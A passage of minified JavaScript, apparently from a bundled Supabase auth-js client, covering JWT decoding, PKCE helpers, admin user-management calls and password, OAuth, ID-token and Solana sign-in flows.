\r=`.split(""),KE=(()=>{const t=new Array(128);for(let e=0;e<t.length;e+=1)t[e]=-1;for(let e=0;e<R0.length;e+=1)t[R0[e].charCodeAt(0)]=-2;for(let e=0;e<Al.length;e+=1)t[Al[e].charCodeAt(0)]=e;return t})();function I0(t,e,r){if(t!==null)for(e.queue=e.queue<<8|t,e.queuedBits+=8;e.queuedBits>=6;){const n=e.queue>>e.queuedBits-6&63;r(Al[n]),e.queuedBits-=6}else if(e.queuedBits>0)for(e.queue=e.queue<<6-e.queuedBits,e.queuedBits=6;e.queuedBits>=6;){const n=e.queue>>e.queuedBits-6&63;r(Al[n]),e.queuedBits-=6}}function Cv(t,e,r){const n=KE[t];if(n>-1)for(e.queue=e.queue<<6|n,e.queuedBits+=6;e.queuedBits>=8;)r(e.queue>>e.queuedBits-8&255),e.queuedBits-=8;else{if(n===-2)return;throw new Error(`Invalid Base64-URL character "${String.fromCharCode(t)}"`)}}function L0(t){const e=[],r=o=>{e.push(String.fromCodePoint(o))},n={utf8seq:0,codepoint:0},s={queue:0,queuedBits:0},i=o=>{YE(o,n,r)};for(let o=0;o<t.length;o+=1)Cv(t.charCodeAt(o),s,i);return e.join("")}function qE(t,e){if(t<=127){e(t);return}else if(t<=2047){e(192|t>>6),e(128|t&63);return}else if(t<=65535){e(224|t>>12),e(128|t>>6&63),e(128|t&63);return}else if(t<=1114111){e(240|t>>18),e(128|t>>12&63),e(128|t>>6&63),e(128|t&63);return}throw new Error(`Unrecognized Unicode codepoint: ${t.toString(16)}`)}function QE(t,e){for(let r=0;r<t.length;r+=1){let n=t.charCodeAt(r);if(n>55295&&n<=56319){const s=(n-55296)*1024&65535;n=(t.charCodeAt(r+1)-56320&65535|s)+65536,r+=1}qE(n,e)}}function YE(t,e,r){if(e.utf8seq===0){if(t<=127){r(t);return}for(let n=1;n<6;n+=1)if(!(t>>7-n&1)){e.utf8seq=n;break}if(e.utf8seq===2)e.codepoint=t&31;else if(e.utf8seq===3)e.codepoint=t&15;else if(e.utf8seq===4)e.codepoint=t&7;else throw new Error("Invalid UTF-8 sequence");e.utf8seq-=1}else if(e.utf8seq>0){if(t<=127)throw new Error("Invalid UTF-8 sequence");e.codepoint=e.codepoint<<6|t&63,e.utf8seq-=1,e.utf8seq===0&&r(e.codepoint)}}function JE(t){const e=[],r={queue:0,queuedBits:0},n=s=>{e.push(s)};for(let s=0;s<t.length;s+=1)Cv(t.charCodeAt(s),r,n);return new Uint8Array(e)}function XE(t){const e=[];return QE(t,r=>e.push(r)),new Uint8Array(e)}function ZE(t){const e=[],r={queue:0,queuedBits:0},n=s=>{e.push(s)};return t.forEach(s=>I0(s,r,n)),I0(null,r,n),e.join("")}function e3(t){return Math.round(Date.now()/1e3)+t}function t3(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(t){const e=Math.random()*16|0;return(t=="x"?e:e&3|8).toString(16)})}const Xt=()=>typeof window<"u"&&typeof document<"u",$n={tested:!1,writable:!1},Tv=()=>{if(!Xt())return!1;try{if(typeof globalThis.localStorage!="object")return!1}catch{return!1}if($n.tested)return $n.writable;const t=`lswt-${Math.random()}${Math.random()}`;try{globalThis.localStorage.setItem(t,t),globalThis.localStorage.removeItem(t),$n.tested=!0,$n.writable=!0}catch{$n.tested=!0,$n.writable=!1}return $n.writable};function r3(t){const e={},r=new URL(t);if(r.hash&&r.hash[0]==="#")try{new URLSearchParams(r.hash.substring(1)).forEach((s,i)=>{e[i]=s})}catch{}return r.searchParams.forEach((n,s)=>{e[s]=n}),e}const Pv=t=>{let e;return t?e=t:typeof fetch>"u"?e=(...r)=>Vt(async()=>{const{default:n}=await Promise.resolve().then(()=>La);return{default:n}},void 0).then(({default:n})=>n(...r)):e=fetch,(...r)=>e(...r)},n3=t=>typeof t=="object"&&t!==null&&"status"in t&&"ok"in t&&"json"in t&&typeof t.json=="function",Ms=async(t,e,r)=>{await t.setItem(e,JSON.stringify(r))},Un=async(t,e)=>{const r=await t.getItem(e);if(!r)return null;try{return JSON.parse(r)}catch{return r}},Yr=async(t,e)=>{await t.removeItem(e)};class gc{constructor(){this.promise=new gc.promiseConstructor((e,r)=>{this.resolve=e,this.reject=r})}}gc.promiseConstructor=Promise;function od(t){const e=t.split(".");if(e.length!==3)throw new Iu("Invalid JWT structure");for(let n=0;n<e.length;n++)if(!FE.test(e[n]))throw new Iu("JWT not in base64url format");return{header:JSON.parse(L0(e[0])),payload:JSON.parse(L0(e[1])),signature:JE(e[2]),raw:{header:e[0],payload:e[1]}}}async function s3(t){return await new Promise(e=>{setTimeout(()=>e(null),t)})}function a3(t,e){return new Promise((n,s)=>{(async()=>{for(let i=0;i<1/0;i++)try{const o=await t(i);if(!e(i,null,o)){n(o);return}}catch(o){if(!e(i,o)){s(o);return}}})()})}function i3(t){return("0"+t.toString(16)).substr(-2)}function o3(){const e=new Uint32Array(56);if(typeof crypto>"u"){const r="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~",n=r.length;let s="";for(let i=0;i<56;i++)s+=r.charAt(Math.floor(Math.random()*n));return s}return crypto.getRandomValues(e),Array.from(e,i3).join("")}async function l3(t){const r=new TextEncoder().encode(t),n=await crypto.subtle.digest("SHA-256",r),s=new Uint8Array(n);return Array.from(s).map(i=>String.fromCharCode(i)).join("")}async function c3(t){if(!(typeof crypto<"u"&&typeof crypto.subtle<"u"&&typeof TextEncoder<"u"))return console.warn("WebCrypto API is not supported. Code challenge method will default to use plain instead of sha256."),t;const r=await l3(t);return btoa(r).replace(/\+/g,"-").replace(/\//g,"_").replace(/=+$/,"")}async function Cs(t,e,r=!1){const n=o3();let s=n;r&&(s+="/PASSWORD_RECOVERY"),await Ms(t,`${e}-code-verifier`,s);const i=await c3(n);return[i,n===i?"plain":"s256"]}const d3=/^2[0-9]{3}-(0[1-9]|1[0-2])-(0[1-9]|1[0-9]|2[0-9]|3[0-1])$/i;function u3(t){const e=t.headers.get(Au);if(!e||!e.match(d3))return null;try{return new Date(`${e}T00:00:00.0Z`)}catch{return null}}function h3(t){if(!t)throw new Error("Missing exp claim");const e=Math.floor(Date.now()/1e3);if(t<=e)throw new Error("JWT has expired")}function f3(t){switch(t){case"RS256":return{name:"RSASSA-PKCS1-v1_5",hash:{name:"SHA-256"}};case"ES256":return{name:"ECDSA",namedCurve:"P-256",hash:{name:"SHA-256"}};default:throw new Error("Invalid alg claim")}}const m3=/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/;function Ts(t){if(!m3.test(t))throw new Error("@supabase/auth-js: Expected parameter to be UUID but is not")}function ld(){const t={};return new Proxy(t,{get:(e,r)=>{if(r==="__isUserNotAvailableProxy")return!0;if(typeof r=="symbol"){const n=r.toString();if(n==="Symbol(Symbol.toPrimitive)"||n==="Symbol(Symbol.toStringTag)"||n==="Symbol(util.inspect.custom)")return}throw new Error(`@supabase/auth-js: client was created with userStorage option and there was no user stored in the user storage. Accessing the "${r}" property of the session object is not supported. Please use getUser() instead.`)},set:(e,r)=>{throw new Error(`@supabase/auth-js: client was created with userStorage option and there was no user stored in the user storage. Setting the "${r}" property of the session object is not supported. Please use getUser() to fetch a user object you can manipulate.`)},deleteProperty:(e,r)=>{throw new Error(`@supabase/auth-js: client was created with userStorage option and there was no user stored in the user storage. Deleting the "${r}" property of the session object is not supported. Please use getUser() to fetch a user object you can manipulate.`)}})}function M0(t){return JSON.parse(JSON.stringify(t))}var p3=function(t,e){var r={};for(var n in t)Object.prototype.hasOwnProperty.call(t,n)&&e.indexOf(n)<0&&(r[n]=t[n]);if(t!=null&&typeof Object.getOwnPropertySymbols=="function")for(var s=0,n=Object.getOwnPropertySymbols(t);s<n.length;s++)e.indexOf(n[s])<0&&Object.prototype.propertyIsEnumerable.call(t,n[s])&&(r[n[s]]=t[n[s]]);return r};const Wn=t=>t.msg||t.message||t.error_description||t.error||JSON.stringify(t),g3=[502,503,504];async function O0(t){var e;if(!n3(t))throw new Ru(Wn(t),0);if(g3.includes(t.status))throw new Ru(Wn(t),t.status);let r;try{r=await t.json()}catch(i){throw new Ev(Wn(i),i)}let n;const s=u3(t);if(s&&s.getTime()>=kv["2024-01-01"].timestamp&&typeof r=="object"&&r&&typeof r.code=="string"?n=r.code:typeof r=="object"&&r&&typeof r.error_code=="string"&&(n=r.error_code),n){if(n==="weak_password")throw new A0(Wn(r),t.status,((e=r.weak_password)===null||e===void 0?void 0:e.reasons)||[]);if(n==="session_not_found")throw new Xr}else if(typeof r=="object"&&r&&typeof r.weak_password=="object"&&r.weak_password&&Array.isArray(r.weak_password.reasons)&&r.weak_password.reasons.length&&r.weak_password.reasons.reduce((i,o)=>i&&typeof o=="string",!0))throw new A0(Wn(r),t.status,r.weak_password.reasons);throw new VE(Wn(r),t.status||500,n)}const x3=(t,e,r,n)=>{const s={method:t,headers:(e==null?void 0:e.headers)||{}};return t==="GET"?s:(s.headers=Object.assign({"Content-Type":"application/json;charset=UTF-8"},e==null?void 0:e.headers),s.body=JSON.stringify(n),Object.assign(Object.assign({},s),r))};async function de(t,e,r,n){var s;const i=Object.assign({},n==null?void 0:n.headers);i[Au]||(i[Au]=kv["2024-01-01"].name),n!=null&&n.jwt&&(i.Authorization=`Bearer ${n.jwt}`);const o=(s=n==null?void 0:n.query)!==null&&s!==void 0?s:{};n!=null&&n.redirectTo&&(o.redirect_to=n.redirectTo);const l=Object.keys(o).length?"?"+new URLSearchParams(o).toString():"",c=await y3(t,e,r+l,{headers:i,noResolveJson:n==null?void 0:n.noResolveJson},{},n==null?void 0:n.body);return n!=null&&n.xform?n==null?void 0:n.xform(c):{data:Object.assign({},c),error:null}}async function y3(t,e,r,n,s,i){const o=x3(e,n,s,i);let l;try{l=await t(r,Object.assign({},o))}catch(c){throw console.error(c),new Ru(Wn(c),0)}if(l.ok||await O0(l),n!=null&&n.noResolveJson)return l;try{return await l.json()}catch(c){await O0(c)}}function Pr(t){var e;let r=null;j3(t)&&(r=Object.assign({},t),t.expires_at||(r.expires_at=e3(t.expires_in)));const n=(e=t.user)!==null&&e!==void 0?e:t;return{data:{session:r,user:n},error:null}}function $0(t){const e=Pr(t);return!e.error&&t.weak_password&&typeof t.weak_password=="object"&&Array.isArray(t.weak_password.reasons)&&t.weak_password.reasons.length&&t.weak_password.message&&typeof t.weak_password.message=="string"&&t.weak_password.reasons.reduce((r,n)=>r&&typeof n=="string",!0)&&(e.data.weak_password=t.weak_password),e}function nn(t){var e;return{data:{user:(e=t.user)!==null&&e!==void 0?e:t},error:null}}function v3(t){return{data:t,error:null}}function b3(t){const{action_link:e,email_otp:r,hashed_token:n,redirect_to:s,verification_type:i}=t,o=p3(t,["action_link","email_otp","hashed_token","redirect_to","verification_type"]),l={action_link:e,email_otp:r,hashed_token:n,redirect_to:s,verification_type:i},c=Object.assign({},o);return{data:{properties:l,user:c},error:null}}function w3(t){return t}function j3(t){return t.access_token&&t.refresh_token&&t.expires_in}const cd=["global","local","others"];var _3=function(t,e){var r={};for(var n in t)Object.prototype.hasOwnProperty.call(t,n)&&e.indexOf(n)<0&&(r[n]=t[n]);if(t!=null&&typeof Object.getOwnPropertySymbols=="function")for(var s=0,n=Object.getOwnPropertySymbols(t);s<n.length;s++)e.indexOf(n[s])<0&&Object.prototype.propertyIsEnumerable.call(t,n[s])&&(r[n[s]]=t[n[s]]);return r};class N3{constructor({url:e="",headers:r={},fetch:n}){this.url=e,this.headers=r,this.fetch=Pv(n),this.mfa={listFactors:this._listFactors.bind(this),deleteFactor:this._deleteFactor.bind(this)}}async signOut(e,r=cd[0]){if(cd.indexOf(r)<0)throw new Error(`@supabase/auth-js: Parameter scope must be one of ${cd.join(", ")}`);try{return await de(this.fetch,"POST",`${this.url}/logout?scope=${r}`,{headers:this.headers,jwt:e,noResolveJson:!0}),{data:null,error:null}}catch(n){if(ae(n))return{data:null,error:n};throw n}}async inviteUserByEmail(e,r={}){try{return await de(this.fetch,"POST",`${this.url}/invite`,{body:{email:e,data:r.data},headers:this.headers,redirectTo:r.redirectTo,xform:nn})}catch(n){if(ae(n))return{data:{user:null},error:n};throw n}}async generateLink(e){try{const{options:r}=e,n=_3(e,["options"]),s=Object.assign(Object.assign({},n),r);return"newEmail"in n&&(s.new_email=n==null?void 0:n.newEmail,delete s.newEmail),await de(this.fetch,"POST",`${this.url}/admin/generate_link`,{body:s,headers:this.headers,xform:b3,redirectTo:r==null?void 0:r.redirectTo})}catch(r){if(ae(r))return{data:{properties:null,user:null},error:r};throw r}}async createUser(e){try{return await de(this.fetch,"POST",`${this.url}/admin/users`,{body:e,headers:this.headers,xform:nn})}catch(r){if(ae(r))return{data:{user:null},error:r};throw r}}async listUsers(e){var r,n,s,i,o,l,c;try{const d={nextPage:null,lastPage:0,total:0},u=await de(this.fetch,"GET",`${this.url}/admin/users`,{headers:this.headers,noResolveJson:!0,query:{page:(n=(r=e==null?void 0:e.page)===null||r===void 0?void 0:r.toString())!==null&&n!==void 0?n:"",per_page:(i=(s=e==null?void 0:e.perPage)===null||s===void 0?void 0:s.toString())!==null&&i!==void 0?i:""},xform:w3});if(u.error)throw u.error;const h=await u.json(),f=(o=u.headers.get("x-total-count"))!==null&&o!==void 0?o:0,m=(c=(l=u.headers.get("link"))===null||l===void 0?void 0:l.split(","))!==null&&c!==void 0?c:[];return m.length>0&&(m.forEach(g=>{const v=parseInt(g.split(";")[0].split("=")[1].substring(0,1)),w=JSON.parse(g.split(";")[1].split("=")[1]);d[`${w}Page`]=v}),d.total=parseInt(f)),{data:Object.assign(Object.assign({},h),d),error:null}}catch(d){if(ae(d))return{data:{users:[]},error:d};throw d}}async getUserById(e){Ts(e);try{return await de(this.fetch,"GET",`${this.url}/admin/users/${e}`,{headers:this.headers,xform:nn})}catch(r){if(ae(r))return{data:{user:null},error:r};throw r}}async updateUserById(e,r){Ts(e);try{return await de(this.fetch,"PUT",`${this.url}/admin/users/${e}`,{body:r,headers:this.headers,xform:nn})}catch(n){if(ae(n))return{data:{user:null},error:n};throw n}}async deleteUser(e,r=!1){Ts(e);try{return await de(this.fetch,"DELETE",`${this.url}/admin/users/${e}`,{headers:this.headers,body:{should_soft_delete:r},xform:nn})}catch(n){if(ae(n))return{data:{user:null},error:n};throw n}}async _listFactors(e){Ts(e.userId);try{const{data:r,error:n}=await de(this.fetch,"GET",`${this.url}/admin/users/${e.userId}/factors`,{headers:this.headers,xform:s=>({data:{factors:s},error:null})});return{data:r,error:n}}catch(r){if(ae(r))return{data:null,error:r};throw r}}async _deleteFactor(e){Ts(e.userId),Ts(e.id);try{return{data:await de(this.fetch,"DELETE",`${this.url}/admin/users/${e.userId}/factors/${e.id}`,{headers:this.headers}),error:null}}catch(r){if(ae(r))return{data:null,error:r};throw r}}}function U0(t={}){return{getItem:e=>t[e]||null,setItem:(e,r)=>{t[e]=r},removeItem:e=>{delete t[e]}}}function S3(){if(typeof globalThis!="object")try{Object.defineProperty(Object.prototype,"__magic__",{get:function(){return this},configurable:!0}),__magic__.globalThis=__magic__,delete Object.prototype.__magic__}catch{typeof self<"u"&&(self.globalThis=self)}}const Ps={debug:!!(globalThis&&Tv()&&globalThis.localStorage&&globalThis.localStorage.getItem("supabase.gotrue-js.locks.debug")==="true")};class Av extends Error{constructor(e){super(e),this.isAcquireTimeout=!0}}class k3 extends Av{}async function E3(t,e,r){Ps.debug&&console.log("@supabase/gotrue-js: navigatorLock: acquire lock",t,e);const n=new globalThis.AbortController;return e>0&&setTimeout(()=>{n.abort(),Ps.debug&&console.log("@supabase/gotrue-js: navigatorLock acquire timed out",t)},e),await Promise.resolve().then(()=>globalThis.navigator.locks.request(t,e===0?{mode:"exclusive",ifAvailable:!0}:{mode:"exclusive",signal:n.signal},async s=>{if(s){Ps.debug&&console.log("@supabase/gotrue-js: navigatorLock: acquired",t,s.name);try{return await r()}finally{Ps.debug&&console.log("@supabase/gotrue-js: navigatorLock: released",t,s.name)}}else{if(e===0)throw Ps.debug&&console.log("@supabase/gotrue-js: navigatorLock: not immediately available",t),new k3(`Acquiring an exclusive Navigator LockManager lock "${t}" immediately failed`);if(Ps.debug)try{const i=await globalThis.navigator.locks.query();console.log("@supabase/gotrue-js: Navigator LockManager state",JSON.stringify(i,null,"  "))}catch(i){console.warn("@supabase/gotrue-js: Error when querying Navigator LockManager state",i)}return console.warn("@supabase/gotrue-js: Navigator LockManager returned a null lock when using #request without ifAvailable set to true, it appears this browser is not following the LockManager spec https://developer.mozilla.org/en-US/docs/Web/API/LockManager/request"),await r()}}))}S3();const C3={url:UE,storageKey:DE,autoRefreshToken:!0,persistSession:!0,detectSessionInUrl:!0,headers:zE,flowType:"implicit",debug:!1,hasCustomAuthorizationHeader:!1};async function D0(t,e,r){return await r()}const As={};class zi{constructor(e){var r,n;this.userStorage=null,this.memoryStorage=null,this.stateChangeEmitters=new Map,this.autoRefreshTicker=null,this.visibilityChangedCallback=null,this.refreshingDeferred=null,this.initializePromise=null,this.detectSessionInUrl=!0,this.hasCustomAuthorizationHeader=!1,this.suppressGetSessionWarning=!1,this.lockAcquired=!1,this.pendingInLock=[],this.broadcastChannel=null,this.logger=console.log,this.instanceID=zi.nextInstanceID,zi.nextInstanceID+=1,this.instanceID>0&&Xt()&&console.warn("Multiple GoTrueClient instances detected in the same browser context. It is not an error, but this should be avoided as it may produce undefined behavior when used concurrently under the same storage key.");const s=Object.assign(Object.assign({},C3),e);if(this.logDebugMessages=!!s.debug,typeof s.debug=="function"&&(this.logger=s.debug),this.persistSession=s.persistSession,this.storageKey=s.storageKey,this.autoRefreshToken=s.autoRefreshToken,this.admin=new N3({url:s.url,headers:s.headers,fetch:s.fetch}),this.url=s.url,this.headers=s.headers,this.fetch=Pv(s.fetch),this.lock=s.lock||D0,this.detectSessionInUrl=s.detectSessionInUrl,this.flowType=s.flowType,this.hasCustomAuthorizationHeader=s.hasCustomAuthorizationHeader,s.lock?this.lock=s.lock:Xt()&&(!((r=globalThis==null?void 0:globalThis.navigator)===null||r===void 0)&&r.locks)?this.lock=E3:this.lock=D0,this.jwks||(this.jwks={keys:[]},this.jwks_cached_at=Number.MIN_SAFE_INTEGER),this.mfa={verify:this._verify.bind(this),enroll:this._enroll.bind(this),unenroll:this._unenroll.bind(this),challenge:this._challenge.bind(this),listFactors:this._listFactors.bind(this),challengeAndVerify:this._challengeAndVerify.bind(this),getAuthenticatorAssuranceLevel:this._getAuthenticatorAssuranceLevel.bind(this)},this.persistSession?(s.storage?this.storage=s.storage:Tv()?this.storage=globalThis.localStorage:(this.memoryStorage={},this.storage=U0(this.memoryStorage)),s.userStorage&&(this.userStorage=s.userStorage)):(this.memoryStorage={},this.storage=U0(this.memoryStorage)),Xt()&&globalThis.BroadcastChannel&&this.persistSession&&this.storageKey){try{this.broadcastChannel=new globalThis.BroadcastChannel(this.storageKey)}catch(i){console.error("Failed to create a new BroadcastChannel, multi-tab state changes will not be available",i)}(n=this.broadcastChannel)===null||n===void 0||n.addEventListener("message",async i=>{this._debug("received broadcast notification from other tab or client",i),await this._notifyAllSubscribers(i.data.event,i.data.session,!1)})}this.initialize()}get jwks(){var e,r;return(r=(e=As[this.storageKey])===null||e===void 0?void 0:e.jwks)!==null&&r!==void 0?r:{keys:[]}}set jwks(e){As[this.storageKey]=Object.assign(Object.assign({},As[this.storageKey]),{jwks:e})}get jwks_cached_at(){var e,r;return(r=(e=As[this.storageKey])===null||e===void 0?void 0:e.cachedAt)!==null&&r!==void 0?r:Number.MIN_SAFE_INTEGER}set jwks_cached_at(e){As[this.storageKey]=Object.assign(Object.assign({},As[this.storageKey]),{cachedAt:e})}_debug(...e){return this.logDebugMessages&&this.logger(`GoTrueClient@${this.instanceID} (${Sv}) ${new Date().toISOString()}`,...e),this}async initialize(){return this.initializePromise?await this.initializePromise:(this.initializePromise=(async()=>await this._acquireLock(-1,async()=>await this._initialize()))(),await this.initializePromise)}async _initialize(){var e;try{const r=r3(window.location.href);let n="none";if(this._isImplicitGrantCallback(r)?n="implicit":await this._isPKCECallback(r)&&(n="pkce"),Xt()&&this.detectSessionInUrl&&n!=="none"){const{data:s,error:i}=await this._getSessionFromURL(r,n);if(i){if(this._debug("#_initialize()","error detecting session from URL",i),WE(i)){const c=(e=i.details)===null||e===void 0?void 0:e.code;if(c==="identity_already_exists"||c==="identity_not_found"||c==="single_identity_not_deletable")return{error:i}}return await this._removeSession(),{error:i}}const{session:o,redirectType:l}=s;return this._debug("#_initialize()","detected session in URL",o,"redirect type",l),await this._saveSession(o),setTimeout(async()=>{l==="recovery"?await this._notifyAllSubscribers("PASSWORD_RECOVERY",o):await this._notifyAllSubscribers("SIGNED_IN",o)},0),{error:null}}return await this._recoverAndRefresh(),{error:null}}catch(r){return ae(r)?{error:r}:{error:new Ev("Unexpected error during initialization",r)}}finally{await this._handleVisibilityChange(),this._debug("#_initialize()","end")}}async signInAnonymously(e){var r,n,s;try{const i=await de(this.fetch,"POST",`${this.url}/signup`,{headers:this.headers,body:{data:(n=(r=e==null?void 0:e.options)===null||r===void 0?void 0:r.data)!==null&&n!==void 0?n:{},gotrue_meta_security:{captcha_token:(s=e==null?void 0:e.options)===null||s===void 0?void 0:s.captchaToken}},xform:Pr}),{data:o,error:l}=i;if(l||!o)return{data:{user:null,session:null},error:l};const c=o.session,d=o.user;return o.session&&(await this._saveSession(o.session),await this._notifyAllSubscribers("SIGNED_IN",c)),{data:{user:d,session:c},error:null}}catch(i){if(ae(i))return{data:{user:null,session:null},error:i};throw i}}async signUp(e){var r,n,s;try{let i;if("email"in e){const{email:u,password:h,options:f}=e;let m=null,g=null;this.flowType==="pkce"&&([m,g]=await Cs(this.storage,this.storageKey)),i=await de(this.fetch,"POST",`${this.url}/signup`,{headers:this.headers,redirectTo:f==null?void 0:f.emailRedirectTo,body:{email:u,password:h,data:(r=f==null?void 0:f.data)!==null&&r!==void 0?r:{},gotrue_meta_security:{captcha_token:f==null?void 0:f.captchaToken},code_challenge:m,code_challenge_method:g},xform:Pr})}else if("phone"in e){const{phone:u,password:h,options:f}=e;i=await de(this.fetch,"POST",`${this.url}/signup`,{headers:this.headers,body:{phone:u,password:h,data:(n=f==null?void 0:f.data)!==null&&n!==void 0?n:{},channel:(s=f==null?void 0:f.channel)!==null&&s!==void 0?s:"sms",gotrue_meta_security:{captcha_token:f==null?void 0:f.captchaToken}},xform:Pr})}else throw new Eo("You must provide either an email or phone number and a password");const{data:o,error:l}=i;if(l||!o)return{data:{user:null,session:null},error:l};const c=o.session,d=o.user;return o.session&&(await this._saveSession(o.session),await this._notifyAllSubscribers("SIGNED_IN",c)),{data:{user:d,session:c},error:null}}catch(i){if(ae(i))return{data:{user:null,session:null},error:i};throw i}}async signInWithPassword(e){try{let r;if("email"in e){const{email:i,password:o,options:l}=e;r=await de(this.fetch,"POST",`${this.url}/token?grant_type=password`,{headers:this.headers,body:{email:i,password:o,gotrue_meta_security:{captcha_token:l==null?void 0:l.captchaToken}},xform:$0})}else if("phone"in e){const{phone:i,password:o,options:l}=e;r=await de(this.fetch,"POST",`${this.url}/token?grant_type=password`,{headers:this.headers,body:{phone:i,password:o,gotrue_meta_security:{captcha_token:l==null?void 0:l.captchaToken}},xform:$0})}else throw new Eo("You must provide either an email or phone number and a password");const{data:n,error:s}=r;return s?{data:{user:null,session:null},error:s}:!n||!n.session||!n.user?{data:{user:null,session:null},error:new ko}:(n.session&&(await this._saveSession(n.session),await this._notifyAllSubscribers("SIGNED_IN",n.session)),{data:Object.assign({user:n.user,session:n.session},n.weak_password?{weakPassword:n.weak_password}:null),error:s})}catch(r){if(ae(r))return{data:{user:null,session:null},error:r};throw r}}async signInWithOAuth(e){var r,n,s,i;return await this._handleProviderSignIn(e.provider,{redirectTo:(r=e.options)===null||r===void 0?void 0:r.redirectTo,scopes:(n=e.options)===null||n===void 0?void 0:n.scopes,queryParams:(s=e.options)===null||s===void 0?void 0:s.queryParams,skipBrowserRedirect:(i=e.options)===null||i===void 0?void 0:i.skipBrowserRedirect})}async exchangeCodeForSession(e){return await this.initializePromise,this._acquireLock(-1,async()=>this._exchangeCodeForSession(e))}async signInWithWeb3(e){const{chain:r}=e;if(r==="solana")return await this.signInWithSolana(e);throw new Error(`@supabase/auth-js: Unsupported chain "${r}"`)}async signInWithSolana(e){var r,n,s,i,o,l,c,d,u,h,f,m;let g,v;if("message"in e)g=e.message,v=e.signature;else{const{chain:w,wallet:y,statement:x,options:b}=e;let j;if(Xt())if(typeof y=="object")j=y;else{const N=window;if("solana"in N&&typeof N.solana=="object"&&("signIn"in N.solana&&typeof N.solana.signIn=="function"||"signMessage"in N.solana&&typeof N.solana.signMessage=="function"))j=N.solana;else throw new Error("@supabase/auth-js: No compatible Solana wallet interface on the window object (window.solana) detected. Make sure the user already has a wallet installed and connected for this app. Prefer passing the wallet interface object directly to signInWithWeb3({ chain: 'solana', wallet: resolvedUserWallet }) instead.")}else{if(typeof y!="object"||!(b!=null&&b.url))throw new Error("@supabase/auth-js: Both wallet and url must be specified in non-browser environments.");j=y}const _=new URL((r=b==null?void 0:b.url)!==null&&r!==void 0?r:window.location.href);if("signIn"in j&&j.signIn){const N=await j.signIn(Object.assign(Object.assign(Object.assign({issuedAt:new Date().toISOString()},b==null?void 0:b.signInWithSolana),{version:"1",domain:_.host,uri:_.href}),x?{statement:x}:null));let S;if(Array.isArray(N)&&N[0]&&typeof N[0]=="object")S=N[0];else if(N&&typeof N=="object"&&"signedMessage"in N&&"signature"in N)S=N;else throw new Error("@supabase/auth-js: Wallet method signIn() returned unrecognized value");if("signedMessage"in S&&"signature"in S&&(typeof S.signedMessage=="string"||S.signedMessage instanceof Uint8Array)&&S.signature instanceof Uint8Array)g=typeof S.signedMessage=="string"?S.signedMessage:new TextDecoder().decode(S.signedMessage),v=S.signature;else throw new Error("@supabase/auth-js: Wallet method signIn() API returned object without signedMessage and signature fields")}else{if(!("signMessage"in j)||typeof j.signMessage!="function"||!("publicKey"in j)||typeof j!="object"||!j.publicKey||!("toBase58"in j.publicKey)||typeof j.publicKey.toBase58!="function")throw new Error("@supabase/auth-js: Wallet does not have a compatible signMessage() and publicKey.toBase58() API");g=[`${_.host} wants you to sign in with your Solana account:`,j.publicKey.toBase58(),...x?["",x,""]:[""],"Version: 1",`URI: ${_.href}`,`Issued At: ${(s=(n=b==null?void 0:b.signInWithSolana)===null||n===void 0?void 0:n.issuedAt)!==null&&s!==void 0?s:new Date().toISOString()}`,...!((i=b==null?void 0:b.signInWithSolana)===null||i===void 0)&&i.notBefore?[`Not Before: ${b.signInWithSolana.notBefore}`]:[],...!((o=b==null?void 0:b.signInWithSolana)===null||o===void 0)&&o.expirationTime?[`Expiration Time: ${b.signInWithSolana.expirationTime}`]:[],...!((l=b==null?void 0:b.signInWithSolana)===null||l===void 0)&&l.chainId?[`Chain ID: ${b.signInWithSolana.chainId}`]:[],...!((c=b==null?void 0:b.signInWithSolana)===null||c===void 0)&&c.nonce?[`Nonce: ${b.signInWithSolana.nonce}`]:[],...!((d=b==null?void 0:b.signInWithSolana)===null||d===void 0)&&d.requestId?[`Request ID: ${b.signInWithSolana.requestId}`]:[],...!((h=(u=b==null?void 0:b.signInWithSolana)===null||u===void 0?void 0:u.resources)===null||h===void 0)&&h.length?["Resources",...b.signInWithSolana.resources.map(S=>`- ${S}`)]:[]].join(`
`);const N=await j.signMessage(new TextEncoder().encode(g),"utf8");if(!N||!(N instanceof Uint8Array))throw new Error("@supabase/auth-js: Wallet signMessage() API returned an recognized value");v=N}}try{const{data:w,error:y}=await de(this.fetch,"POST",`${this.url}/token?grant_type=web3`,{headers:this.headers,body:Object.assign({chain:"solana",message:g,signature:ZE(v)},!((f=e.options)===null||f===void 0)&&f.captchaToken?{gotrue_meta_security:{captcha_token:(m=e.options)===null||m===void 0?void 0:m.captchaToken}}:null),xform:Pr});if(y)throw y;return!w||!w.session||!w.user?{data:{user:null,session:null},error:new ko}:(w.session&&(await this._saveSession(w.session),await this._notifyAllSubscribers("SIGNED_IN",w.session)),{data:Object.assign({},w),error:y})}catch(w){if(ae(w))return{data:{user:null,session:null},error:w};throw w}}async _exchangeCodeForSession(e){const r=await Un(this.storage,`${this.storageKey}-code-verifier`),[n,s]=(r??"").split("/");try{const{data:i,error:o}=await de(this.fetch,"POST",`${this.url}/token?grant_type=pkce`,{headers:this.headers,body:{auth_code:e,code_verifier:n},xform:Pr});if(await Yr(this.storage,`${this.storageKey}-code-verifier`),o)throw o;return!i||!i.session||!i.user?{data:{user:null,session:null,redirectType:null},error:new ko}:(i.session&&(await this._saveSession(i.session),await this._notifyAllSubscribers("SIGNED_IN",i.session)),{data:Object.assign(Object.assign({},i),{redirectType:s??null}),error:o})}catch(i){if(ae(i))return{data:{user:null,session:null,redirectType:null},error:i};throw i}}async signInWithIdToken(e){try{const{options:r,provider:n,token:s,access_token:i,nonce:o}=e,l=await de(this.fetch,"POST",`${this.url}/token?grant_type=id_token`,{headers:this.headers,body:{provider:n,id_token:s,access_token:i,nonce:o,gotrue_meta_security:{captcha_token:r==null?void 0:r.captchaToken}},xform:Pr}),{data:c,error:d}=l;return d?{data:{user:null,session:null},error:d}:!c||!c.session||!c.user?{data:{user:null,session:null},error:new ko}:(c.session&&(await this._saveSession(c.session),await this._notifyAllSubscribers("SIGNED_IN",c.session)),{data:c,error:d})}catch(r){if(ae(r))return{data:{user:null,session:null},error:r};throw r}}async signInWithOtp(e){var r,n,s,i,o;try{if("email"in e){const{email:l,options:c}=e;let d=null,u=null;this.flowType==="pkce"&&([d,u]=await Cs(this.storage,this.storageKey));const{error:h}=await 